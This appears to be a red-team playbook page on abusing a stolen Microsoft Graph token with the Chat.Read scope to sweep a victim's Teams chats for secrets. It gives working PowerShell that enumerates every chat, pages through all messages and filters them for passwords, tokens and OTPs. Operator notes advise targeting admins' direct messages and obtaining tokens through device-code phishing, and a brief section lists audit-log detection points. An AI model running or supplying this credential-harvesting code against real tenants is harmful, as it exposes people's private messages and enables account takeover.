## Overview

The `Chat.Read` delegated scope on Microsoft Graph exposes the complete Teams message history of the authenticated identity — direct messages, group chats, and meeting chat threads including historical content. Teams is a high-value target because it functions as an informal communication channel where users routinely share credentials, temporary passwords, access codes, and sensitive operational information without the scrutiny applied to email.

Unlike email, Teams messages are not auto-deleted. A credential shared in a direct message six months ago may still be accessible via API.

## Preconditions

| Requirement | Detail |
|---|---|
| Delegated Graph token | Must correspond to the identity whose chats are being read |
| `Chat.Read` scope | Included in the token — grants read access to all chats and messages |
| `User.ReadBasic.All` | Optional — enables resolving participant identities within chats |

## Attack Chain

```
Compromised Graph token with Chat.Read
     ↓
GET /me/chats  →  enumerate all chats (oneOnOne, group, meeting)
     ↓
For each chat:  GET /me/chats/{chatId}/messages
     ↓
Search message content for credential patterns
     ↓
Extract: passwords, tokens, OTPs, URLs, file paths, internal system names
```

## Enumerating Chats

```powershell
$chats = (Invoke-RestMethod -Method GET `
    -Uri "https://graph.microsoft.com/v1.0/me/chats?`$expand=members" `
    -Headers @{ Authorization = "Bearer $Graph" }).value

$chats | ForEach-Object {
    [PSCustomObject]@{
        ChatId      = $_.id
        Type        = $_.chatType    # oneOnOne, group, meeting
        Topic       = $_.topic
        LastUpdated = $_.lastUpdatedDateTime
        Members     = ($_.members | ForEach-Object { $_.displayName }) -join ", "
    }
} | Sort-Object LastUpdated -Descending | Format-Table
```

## Reading Messages with Keyword Search

```powershell
$chatId = "<CHAT_ID>"
$allMessages = @()
$uri = "https://graph.microsoft.com/v1.0/me/chats/$chatId/messages?`$top=50"

do {
    $response     = Invoke-RestMethod -Method GET -Uri $uri -Headers @{ Authorization = "Bearer $Graph" }
    $allMessages += $response.value
    $uri          = $response.'@odata.nextLink'
} while ($uri)

# Search for credential patterns
$keywords = "password|contraseña|secret|token|credential|pass|key|otp|pin|access"
$allMessages | Where-Object { $_.deletedDateTime -eq $null } | ForEach-Object {
    $content = $_.body.content -replace "<[^>]+>", ""
    if ($content -match $keywords) {
        [PSCustomObject]@{
            From    = $_.from.user.displayName
            Sent    = $_.createdDateTime
            Content = $content.Trim()
        }
    }
} | Format-List
```

## Sweeping All Chats

```powershell
$allChats    = (Invoke-RestMethod -Method GET `
    -Uri "https://graph.microsoft.com/v1.0/me/chats" `
    -Headers @{ Authorization = "Bearer $Graph" }).value
$findings    = @()
$keywords    = "password|contraseña|secret|token|credential|pass|key|otp"

foreach ($chat in $allChats) {
    $uri = "https://graph.microsoft.com/v1.0/me/chats/$($chat.id)/messages?`$top=50"
    do {
        $resp = Invoke-RestMethod -Method GET -Uri $uri -Headers @{ Authorization = "Bearer $Graph" }
        foreach ($msg in $resp.value) {
            $content = $msg.body.content -replace "<[^>]+>", ""
            if ($content -match $keywords) {
                $findings += [PSCustomObject]@{
                    ChatId  = $chat.id
                    From    = $msg.from.user.displayName
                    Sent    = $msg.createdDateTime
                    Content = $content.Trim()
                }
            }
        }
        $uri = $resp.'@odata.nextLink'
    } while ($uri)
}
$findings | Format-List
```

## Operator Notes

- Prioritize `oneOnOne` chats between privileged users — IT, security, and admin-to-admin messages are the highest-value targets.
- Meeting chats often contain shared links, codes, and ad-hoc credential exchanges during project work.
- Full pagination is required for high-volume chat histories — the default page size is 50 messages.
- `Chat.Read` is included in scopes obtainable via DCF phishing using FOCI client IDs — a single phishing event can yield tokens with this scope.
- Consider running the sweep against recently updated chats first (`Sort-Object LastUpdated -Descending`) to prioritize fresh content.

## Detection / Friction Points

- Graph API calls to `/me/chats` and `/me/chats/{id}/messages` appear in the Microsoft 365 Unified Audit Log under `ChatMsgViewed` events — but only if Advanced Audit is enabled (Microsoft 365 E5 or add-on).
- Bulk message reads across many chats in a short window generate unusually high API call volume — detectable via Graph usage analytics or Microsoft Defender for Cloud Apps anomaly detection.
- The delegated token is scoped to the compromised identity's chats — the activity is logged under that identity's account, not a separate system account.
